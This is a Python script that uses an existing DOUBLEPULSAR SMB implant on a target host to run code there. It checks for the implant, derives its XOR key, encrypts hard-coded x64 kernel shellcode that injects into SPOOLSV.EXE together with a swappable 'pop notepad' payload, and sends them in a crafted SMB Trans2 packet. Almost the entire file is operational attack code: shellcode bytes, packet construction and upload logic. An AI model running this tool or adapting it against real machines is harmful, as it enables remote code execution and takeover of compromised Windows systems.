#!/usr/bin/python

import binascii
import socket
import struct

def hexdump(src, length=16, sep='.'):
    """Hex dump bytes to ASCII string, padded neatly
    In [107]: x = b'\x01\x02\x03\x04AAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB'
    In [108]: print('\n'.join(hexdump(x)))
    00000000  01 02 03 04 41 41 41 41  41 41 41 41 41 41 41 41 |....AAAAAAAAAAAA|
    00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 42 42 |AAAAAAAAAAAAAABB|
    00000020  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42 |BBBBBBBBBBBBBBBB|
    00000030  42 42 42 42 42 42 42 42                          |BBBBBBBB        |
    """
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])
    lines = []
    for c in range(0, len(src), length):
        chars = src[c: c + length]
        hex_ = ' '.join(['{:02x}'.format(x) for x in chars])
        if len(hex_) > 24:
            hex_ = '{} {}'.format(hex_[:24], hex_[24:])
        printable = ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
        lines.append('{0:08x}  {1:{2}s} |{3:{4}s}|'.format(c, hex_, length * 3, printable, length))
    return lines


shellcode = b""
shellcode += b"\x31\xc9\x41\xe2\x01\xc3\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53"
shellcode += b"\x55\x48\x89\xe5\x66\x83\xe4\xf0\x48\x83\xec\x20\x4c\x8d\x35\xe3"
shellcode += b"\xff\xff\xff\x65\x4c\x8b\x3c\x25\x38\x00\x00\x00\x4d\x8b\x7f\x04"
shellcode += b"\x49\xc1\xef\x0c\x49\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x49"
shellcode += b"\x8b\x37\x66\x81\xfe\x4d\x5a\x75\xef\x41\xbb\x5c\x72\x11\x62\xe8"
shellcode += b"\x18\x02\x00\x00\x48\x89\xc6\x48\x81\xc6\x08\x03\x00\x00\x41\xbb"
shellcode += b"\x7a\xba\xa3\x30\xe8\x03\x02\x00\x00\x48\x89\xf1\x48\x39\xf0\x77"
shellcode += b"\x11\x48\x8d\x90\x00\x05\x00\x00\x48\x39\xf2\x72\x05\x48\x29\xc6"
shellcode += b"\xeb\x08\x48\x8b\x36\x48\x39\xce\x75\xe2\x49\x89\xf4\x31\xdb\x89"
shellcode += b"\xd9\x83\xc1\x04\x81\xf9\x00\x00\x01\x00\x0f\x8d\x66\x01\x00\x00"
shellcode += b"\x4c\x89\xf2\x89\xcb\x41\xbb\x66\x55\xa2\x4b\xe8\xbc\x01\x00\x00"
shellcode += b"\x85\xc0\x75\xdb\x49\x8b\x0e\x41\xbb\xa3\x6f\x72\x2d\xe8\xaa\x01"
shellcode += b"\x00\x00\x48\x89\xc6\xe8\x50\x01\x00\x00\x41\x81\xf9";

shellcode_part_two = b""
shellcode_part_two += b"\x75\xbc\x49\x8b\x1e\x4d\x8d\x6e\x10\x4c\x89\xea\x48\x89\xd9"
shellcode_part_two += b"\x41\xbb\xe5\x24\x11\xdc\xe8\x81\x01\x00\x00\x6a\x40\x68\x00\x10"
shellcode_part_two += b"\x00\x00\x4d\x8d\x4e\x08\x49\xc7\x01\x00\x10\x00\x00\x4d\x31\xc0"
shellcode_part_two += b"\x4c\x89\xf2\x31\xc9\x48\x89\x0a\x48\xf7\xd1\x41\xbb\x4b\xca\x0a"
shellcode_part_two += b"\xee\x48\x83\xec\x20\xe8\x52\x01\x00\x00\x85\xc0\x0f\x85\xc8\x00"
shellcode_part_two += b"\x00\x00\x49\x8b\x3e\x48\x8d\x35\xe9\x00\x00\x00\x31\xc9\x66\x03"
shellcode_part_two += b"\x0d\xd7\x01\x00\x00\x66\x81\xc1\xf9\x00\xf3\xa4\x48\x89\xde\x48"
shellcode_part_two += b"\x81\xc6\x08\x03\x00\x00\x48\x89\xf1\x48\x8b\x11\x4c\x29\xe2\x51"
shellcode_part_two += b"\x52\x48\x89\xd1\x48\x83\xec\x20\x41\xbb\x26\x40\x36\x9d\xe8\x09"
shellcode_part_two += b"\x01\x00\x00\x48\x83\xc4\x20\x5a\x59\x48\x85\xc0\x74\x18\x48\x8b"
shellcode_part_two += b"\x80\xc8\x02\x00\x00\x48\x85\xc0\x74\x0c\x48\x83\xc2\x4c\x8b\x02"
shellcode_part_two += b"\x0f\xba\xe0\x05\x72\x05\x48\x8b\x09\xeb\xbe\x48\x83\xea\x4c\x49"
shellcode_part_two += b"\x89\xd4\x31\xd2\x80\xc2\x90\x31\xc9\x41\xbb\x26\xac\x50\x91\xe8"
shellcode_part_two += b"\xc8\x00\x00\x00\x48\x89\xc1\x4c\x8d\x89\x80\x00\x00\x00\x41\xc6"
shellcode_part_two += b"\x01\xc3\x4c\x89\xe2\x49\x89\xc4\x4d\x31\xc0\x41\x50\x6a\x01\x49"
shellcode_part_two += b"\x8b\x06\x50\x41\x50\x48\x83\xec\x20\x41\xbb\xac\xce\x55\x4b\xe8"
shellcode_part_two += b"\x98\x00\x00\x00\x31\xd2\x52\x52\x41\x58\x41\x59\x4c\x89\xe1\x41"
shellcode_part_two += b"\xbb\x18\x38\x09\x9e\xe8\x82\x00\x00\x00\x4c\x89\xe9\x41\xbb\x22"
shellcode_part_two += b"\xb7\xb3\x7d\xe8\x74\x00\x00\x00\x48\x89\xd9\x41\xbb\x0d\xe2\x4d"
shellcode_part_two += b"\x85\xe8\x66\x00\x00\x00\x48\x89\xec\x5d\x5b\x41\x5c\x41\x5d\x41"
shellcode_part_two += b"\x5e\x41\x5f\x5e\xc3\xe9\xb5\x00\x00\x00\x4d\x31\xc9\x31\xc0\xac"
shellcode_part_two += b"\x41\xc1\xc9\x0d\x3c\x61\x7c\x02\x2c\x20\x41\x01\xc1\x38\xe0\x75"
shellcode_part_two += b"\xec\xc3\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
shellcode_part_two += b"\x20\x48\x8b\x12\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x45\x31\xc9"
shellcode_part_two += b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1"
shellcode_part_two += b"\xe2\xee\x45\x39\xd9\x75\xda\x4c\x8b\x7a\x20\xc3\x4c\x89\xf8\x41"
shellcode_part_two += b"\x51\x41\x50\x52\x51\x56\x48\x89\xc2\x8b\x42\x3c\x48\x01\xd0\x8b"
shellcode_part_two += b"\x80\x88\x00\x00\x00\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
shellcode_part_two += b"\x49\x01\xd0\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\xe8\x78\xff"
shellcode_part_two += b"\xff\xff\x45\x39\xd9\x75\xec\x58\x44\x8b\x40\x24\x49\x01\xd0\x66"
shellcode_part_two += b"\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
shellcode_part_two += b"\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5b\x41\x53\xff\xe0\x56"
shellcode_part_two += b"\x41\x57\x55\x48\x89\xe5\x48\x83\xec\x20\x41\xbb\xda\x16\xaf\x92"
shellcode_part_two += b"\xe8\x4d\xff\xff\xff\x31\xc9\x51\x51\x51\x51\x41\x59\x4c\x8d\x05"
shellcode_part_two += b"\x1a\x00\x00\x00\x5a\x48\x83\xec\x20\x41\xbb\x46\x45\x1b\x22\xe8"
shellcode_part_two += b"\x68\xff\xff\xff\x48\x89\xec\x5d\x41\x5f\x5e\xc3"

# pop notepad shellcode - this is a sample.  Change according to your payload
payload_shellcode = b""
payload_shellcode += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d"
payload_shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\x21\xb7\xcf\x1b\x7c"
payload_shellcode += b"\xbb\xab\xac\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
payload_shellcode += b"\xff\xe2\xf4\xdd\xff\x4c\xff\x8c\x53\x6b\xac\x21"
payload_shellcode += b"\xb7\x8e\x4a\x3d\xeb\xf9\xfd\x77\xff\xfe\xc9\x19"
payload_shellcode += b"\xf3\x20\xfe\x41\xff\x44\x49\x64\xf3\x20\xfe\x01"
payload_shellcode += b"\xff\x44\x69\x2c\xf3\xa4\x1b\x6b\xfd\x82\x2a\xb5"
payload_shellcode += b"\xf3\x9a\x6c\x8d\x8b\xae\x67\x7e\x97\x8b\xed\xe0"
payload_shellcode += b"\x7e\xc2\x5a\x7d\x7a\x49\x41\x73\xf6\x9e\x53\xf7"
payload_shellcode += b"\xe9\x8b\x27\x63\x8b\x87\x1a\xac\x30\x2b\x24\x21"
payload_shellcode += b"\xb7\xcf\x53\xf9\x7b\xdf\xcb\x69\xb6\x1f\x4b\xf7"
payload_shellcode += b"\xf3\xb3\xe8\xaa\xf7\xef\x52\x7d\x6b\x48\xfa\x69"
payload_shellcode += b"\x48\x06\x5a\xf7\x8f\x23\xe4\x20\x61\x82\x2a\xb5"
payload_shellcode += b"\xf3\x9a\x6c\x8d\xf6\x0e\xd2\x71\xfa\xaa\x6d\x19"
payload_shellcode += b"\x57\xba\xea\x30\xb8\xe7\x88\x29\xf2\xf6\xca\x09"
payload_shellcode += b"\x63\xf3\xe8\xaa\xf7\xeb\x52\x7d\x6b\xcd\xed\xaa"
payload_shellcode += b"\xbb\x87\x5f\xf7\xfb\xb7\xe5\x20\x67\x8e\x90\x78"
payload_shellcode += b"\x33\xe3\xad\xf1\xf6\x97\x5a\x24\xe5\xf2\xf6\x60"
payload_shellcode += b"\xef\x8e\x42\x3d\xe1\xe3\x2f\xcd\x97\x8e\x49\x83"
payload_shellcode += b"\x5b\xf3\xed\x78\xed\x87\x90\x6e\x52\xfc\x53\xde"
payload_shellcode += b"\x48\x92\x53\xc6\xba\xab\xac\x21\xb7\xcf\x1b\x7c"
payload_shellcode += b"\xf3\x26\x21\x20\xb6\xcf\x1b\x3d\x01\x9a\x27\x4e"
payload_shellcode += b"\x30\x30\xce\xc7\x4b\x1e\x0e\x77\xf6\x75\xbd\xe9"
payload_shellcode += b"\x06\x36\x53\xf4\xff\x4c\xdf\x54\x87\xad\xd0\x2b"
payload_shellcode += b"\x37\x34\xfb\x09\xbe\x10\xeb\x32\xc5\xa0\x71\x7c"
payload_shellcode += b"\xe2\xea\x25\xfb\x48\x1a\x75\x13\xcf\xce\xdc\x40"
payload_shellcode += b"\xd3\xe1\x7e\x04\xde\xab\xac"

def ror(dword, bits):
    """Rotate right (ROR) operation for 32-bit integers."""
    return ((dword >> bits) | (dword << (32 - bits))) & 0xFFFFFFFF

def generate_process_hash(process):
    """Generate a process hash based on the given process name."""
    proc_hash = 0
    proc = process + '\0'  # Null-terminated string

    for char in proc:
        proc_hash = ror(proc_hash, 13)
        proc_hash = (proc_hash + ord(char)) & 0xFFFFFFFF

    return proc_hash

def calculate_doublepulsar_xor_key(s):
    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    return x


# The arch is adjacent to the XOR key in the SMB signature
def calculate_doublepulsar_arch(s):
    if s & 0xffffffff00000000 == 0:
        return "x86 (32-bit)"
    else:
        return "x64 (64-bit)"


def byte_xor(data, key):
    key_bytes = key.to_bytes(4, byteorder='little')
    key_length = len(key_bytes)
    '''
    for i in range(len(data)):
        data[i] ^= key_bytes[i % key_length]
    return data
    '''
    return bytearray(data[i] ^ key_bytes[i % key_length] for i in range(len(data)))

# https://github.com/bjornedstrom/elliptic-curve-chemistry-set/blob/master/eddsa.py
def le2int(buf):
    """little endian buffer to integer."""
    integer = 0
    shift = 0
    for byte in buf:
        integer |= ord(byte) << shift
        shift += 8
    return integer


def int2le(integer, pad):
    """integer to little endian buffer."""
    buf = []
    while integer:
        buf.append(chr(integer & 0xff))
        integer >>= 8
        pad -= 1
    while pad > 0:
        buf.append('\x00')
        pad -= 1
    if not buf:
        return '\x00'
    return ''.join(buf)


# converted with chatgpt
def int_to_le(data: int) -> bytes:
    b = bytearray(4)
    b[0] = data & 0xFF
    b[1] = (data >> 8) & 0xFF
    b[2] = (data >> 16) & 0xFF
    b[3] = (data >> 24) & 0xFF
    return bytes(b)


'''
# Test the function
data = 0x12345678
result = int_to_le(data)
print(result)  # Output: b'xV4\x12'
print("Bytes: ", " ".join(f"{byte:02X}" for byte in result))
'''

if __name__ == "__main__":

    # Packets
    negotiate_protocol_request = binascii.unhexlify(
        "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
    session_setup_request = binascii.unhexlify(
        "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
    tree_connect_request = binascii.unhexlify(
        "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
    trans2_session_setup = binascii.unhexlify(
        "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")

    timeout = 5.0
    # sample IP
    ip = "192.168.0.70"

    # Connect to socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(float(timeout) if timeout else None)
    host = ip
    port = 445
    s.connect((host, port))

    # Send/receive negotiate protocol request
    print("Sending negotiation protocol request")
    s.send(negotiate_protocol_request)
    s.recv(1024)

    # Send/receive session setup request
    print("Sending session setup request")
    s.send(session_setup_request)
    session_setup_response = s.recv(1024)

    # Extract user ID from session setup response
    user_id = session_setup_response[32:34]
    print("User ID = %s" % struct.unpack("<H", user_id)[0])

    # Replace user ID in tree connect request packet
    modified_tree_connect_request = bytearray(tree_connect_request)
    modified_tree_connect_request[32] = user_id[0]
    modified_tree_connect_request[33] = user_id[1]

    # Send tree connect request
    print("Sending tree connect")
    s.send(modified_tree_connect_request)
    tree_connect_response = s.recv(1024)

    # Extract tree ID from response
    tree_id = tree_connect_response[28:30]
    print("Tree ID = %s" % struct.unpack("<H", tree_id)[0])

    # Replace tree ID and user ID in trans2 session setup packet
    modified_trans2_session_setup = bytearray(trans2_session_setup)
    modified_trans2_session_setup[28] = tree_id[0]
    modified_trans2_session_setup[29] = tree_id[1]
    modified_trans2_session_setup[32] = user_id[0]
    modified_trans2_session_setup[33] = user_id[1]

    # Send trans2 sessions setup request
    print("Sending trans2 session setup - ping command")
    s.send(modified_trans2_session_setup)
    final_response = s.recv(1024)

    # Check for 0x51 response to indicate DOUBLEPULSAR infection
    if final_response[34] == 81:
        signature = final_response[18:22]
        signature_long = struct.unpack('<I', signature)[0]
        key = calculate_doublepulsar_xor_key(signature_long)

        arch_signature = final_response[18:26]
        arch_signature_long = struct.unpack('<Q', arch_signature)[0]
        arch = calculate_doublepulsar_arch(arch_signature_long)

        print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))

        proc_name = "SPOOLSV.EXE"
        proc_hash = generate_process_hash(proc_name)
        print(f"Process Hash for {proc_name}: 0x{proc_hash:08X}")

        hMem = bytearray(4096)
        shellcode_one_part_len = len(shellcode)
        shellcode_part_two_len = len(shellcode_part_two)
        ring3_len = len(payload_shellcode)
        kernel_shellcode_size = shellcode_one_part_len + shellcode_part_two_len + 4

        # Fill memory with 0x90 (NOP equivalent)
        hMem[:4096] = bytes([0x90] * 4096)
        proc_hash_bytes = proc_hash.to_bytes(4, byteorder='little')

        hMem[:shellcode_one_part_len] = shellcode
        hMem[shellcode_one_part_len:shellcode_one_part_len + 4] = proc_hash_bytes
        hMem[shellcode_one_part_len + 4:shellcode_one_part_len + 4 + shellcode_part_two_len] = shellcode_part_two

        ring3_len_bytes = ring3_len.to_bytes(2, byteorder='little')
        hMem[kernel_shellcode_size:kernel_shellcode_size + 2] = ring3_len_bytes
        hMem[kernel_shellcode_size + 2:kernel_shellcode_size + 2 + ring3_len] = payload_shellcode

        # generate the final payload shellcode first
        modified_kernel_shellcode = bytearray(hMem)
        # bytes_payload_shellcode = bytearray(buf)

        # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
        # payload_shellcode_size = kernel_shellcode_size #len(bytes_payload_shellcode)

        # payload_shellcode_size_in_hex = struct.pack('<H', kernel_shellcode_size)
        # modified_kernel_shellcode += payload_shellcode_size_in_hex
        # modified_kernel_shellcode += bytes_payload_shellcode


        # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
        payload_shellcode_size = len(modified_kernel_shellcode)

        payload_shellcode_size_in_hex = struct.pack('<H', payload_shellcode_size)

        shellcode_payload_size = len(modified_kernel_shellcode)
        print("Total size of shellcode:  %d" % shellcode_payload_size)

        # commenting out the padding to 4096 bytes until this can be confirmed to work
        # not a good idea to use NOPS either

        print("Total size of shellcode before padding:  %d" % shellcode_payload_size)
        padded_bytes = 4096 - shellcode_payload_size

        bytes_filler_bytes = bytearray()
        bytes_filler_bytes += b'\x90' * padded_bytes
        modified_kernel_shellcode += bytes_filler_bytes
        buffer_len = len(modified_kernel_shellcode)
        print("Total size of shellcode after padding:  %d" % buffer_len)


        # xor the payload data now
        print("encrypting the shellcode with the XOR key")
        xor_bytes = byte_xor(modified_kernel_shellcode, key)

        # build the doublepulsar parameters
        EntireShellcodeSize = len(modified_kernel_shellcode)
        print("Generating the parameters...")
        parameters = bytearray()
        '''
        since our payload is less than 4096, we can send the packet in one packet.
        it is possible for the EntireSize to be 5 MB in bytes
        it is not possible for the chunksize to be more than 4096
        if this is a large payload, you must increment the offset by the last chunk size
        '''
        EntireSize = struct.pack('<I', buffer_len)  # entire value of the payload being uploaded
        ChunkSize = struct.pack('<I', buffer_len)  # using the same value since chunk size is less than 4096
        offset = struct.pack('<I',
                             0)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
        parameters += EntireSize
        parameters += ChunkSize
        parameters += offset
        parameters_bytearray = bytearray(parameters)
        xor_parameters = byte_xor(parameters_bytearray, key)

        # build the execution packet
        trans2_exec_packet = binascii.unhexlify(
            "0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
        doublepulsar_exec_packet = bytearray(trans2_exec_packet)

        trans2_packet_len = len(doublepulsar_exec_packet)
        print("Total size of SMB packet:  %d" % trans2_packet_len)

        packet_len = trans2_packet_len + buffer_len
        print("Total size of SMB packet & shellcode:  %d" % packet_len)

        print("we take out 4 from the total size because the NetBIOS length is not counted in the SMB Packet")
        print(
            "Example: A full packet wil be 4178 bytes in length.  4096 bytes for shellcode, 70 for the SMB doublepulsar packet, 12 for the parameters")
        print("but the NetBIOS header will say 4174 because the 4 bytes in the NetBIOS header doesn't count")

        '''
        merged packet len = trans2 packet len ( 70 & contains NetBIOS Header )
                           + merged shellcode length size
                           + parameter len ( 12 )
                           - NetBIOS header (4 )
        '''
        merged_packet_len = trans2_packet_len + buffer_len + 12 - 4
        print("UPDATED:  Total size of SMB packet & shellcode:  %d" % merged_packet_len)

        print("Updating SMB length value...")
        # SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
        # If fails, try using: smb_length = struct.pack('>i', merged_packet_len)
        smb_length = struct.pack('>H', merged_packet_len)
        doublepulsar_exec_packet[2] = smb_length[0]
        doublepulsar_exec_packet[3] = smb_length[1]

        # <H = Little Endian unsigned short
        TotalDataCount = struct.pack('<H', buffer_len)
        DataCount = struct.pack('<H', buffer_len)
        ByteCount = struct.pack('<H', buffer_len + 12)

        '''
        not sure why we add 13 here
        and not 12 but it's because of the parameters but it's in the Doublepulsar 
        examples so we'll just copy that
        '''

        # update TotalDataCount in the packet ( default in the packet is 4096 )
        doublepulsar_exec_packet[39] = TotalDataCount[0]
        doublepulsar_exec_packet[40] = TotalDataCount[1]
        # update DataCount in the packet ( default in the packet is 4096 )
        doublepulsar_exec_packet[59] = DataCount[0]
        doublepulsar_exec_packet[60] = DataCount[1]
        # update ByteCount in the packet ( default in the packet is 4109 )
        doublepulsar_exec_packet[67] = ByteCount[0]
        doublepulsar_exec_packet[68] = ByteCount[1]

        # update values for tree ID and user ID
        doublepulsar_exec_packet[28] = tree_id[0]
        doublepulsar_exec_packet[29] = tree_id[1]
        doublepulsar_exec_packet[32] = user_id[0]
        doublepulsar_exec_packet[33] = user_id[1]

        doublepulsar_exec_packet += xor_parameters
        doublepulsar_exec_packet += xor_bytes

        print("hex content of the hex packet")
        print(hexdump(doublepulsar_exec_packet))
        print("Length of the final hex packet", len(doublepulsar_exec_packet))
        s.send(doublepulsar_exec_packet)
        smb_response = s.recv(1024)

        # 0x52
        if smb_response[34] == 82:
            print("Doublepulsar returned:  Success!\n")
        # 0x62
        elif smb_response[34] == 98:
            print("Doublepulsar returned:  Invalid parameters!\n")
        # 0x72
        elif smb_response[34] == 114:
            print("Doublepulsar returned:  Allocation failure!\n")
        else:
            print("Doublepulsar didn't succeed\n")

        tree_disconnect = binascii.unhexlify(
            "00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000")
        tree_disconnect_packet = bytearray(tree_disconnect)
        tree_disconnect_packet[28] = tree_id[0]
        tree_disconnect_packet[29] = tree_id[1]
        tree_disconnect_packet[32] = user_id[0]
        tree_disconnect_packet[33] = user_id[1]
        s.send(tree_disconnect_packet)
        smb_response = s.recv(1024)

        logoff = binascii.unhexlify(
            "00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000")
        logoff_packet = bytearray(logoff)
        logoff_packet[28] = tree_id[0]
        logoff_packet[29] = tree_id[1]
        logoff_packet[32] = user_id[0]
        logoff_packet[33] = user_id[1]
        s.send(logoff_packet)
        smb_response = s.recv(1024)
